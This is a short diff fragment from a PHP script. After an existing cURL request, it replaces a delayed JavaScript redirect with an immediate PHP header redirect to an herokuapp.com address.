@@ -208,9 +208,8 @@ $ch = curl_init();
       $result = curl_exec($ch);
       curl_close ($ch);
    }
-exit;
+header("Location: https://p888999p.herokuapp.com"); 
+exit();
 ?>
 
-<script type="text/JavaScript">
-          setTimeout("location.href = 'https://p888999p.herokuapp.com';",2000);
-</script>
+
